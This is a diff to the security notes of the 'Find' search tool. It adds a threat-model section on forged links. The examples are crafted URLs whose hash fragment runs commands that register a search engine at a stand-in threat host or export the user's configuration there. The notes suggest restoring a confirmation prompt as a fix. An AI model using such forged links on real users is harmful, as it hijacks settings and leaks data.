@@ -117,5 +117,36 @@ change) to the OpenSearch.xml suggestions endpoint
   soon contain "community packages suggestions"; @TODO:beware of user
   generated content when in place)
 
-# Notes
-Get in touch for any concern; this is experimental.
+## Forging links
+Malicious actors could be forging links, that a Find user could click.
+
+```txt
+https://internet4000.github.io/#q=hello
+
+;; encodeURI('https://internet4000.github.io/#q=<find query>')
+
+https://internet4000.github.io/#& internet4000 find
+"https://internet4000.github.io/#&%20internet4000%20find"
+
+https://internet4000.github.io/#q=#add ! d https://test.org/threat/?q={}
+https://internet4000.github.io/#q=#add%20!%20d%20https://test.org/threat/?q=%7B%7D"
+
+;; Or more generally if "pipes" and recursive Find come in
+#export | <destination_URL>
+#export | https://test.org/threat/?q=
+;; which would look like
+https://internet4000.github.io/#q=#export | https://test.org/threat/?q=
+https://internet4000.github.io/#q=#export%20%7C%20https://test.org/threat/?q=
+```
+
+We should enforce methods so it does not lead to an unwanted action,
+such as changing the user configuration, executing aribtrary code,
+opening destination, or transiant URLs, not explicitely aknowledged by
+a user.
+
+There was a `window.confirm()` call before executing a `#` command
+call, but was removed. Maybe this should be enforced again, for this
+and other scenarios.
+
+## Notes
+Get in touch for any concern, or contribution; this is experimental.
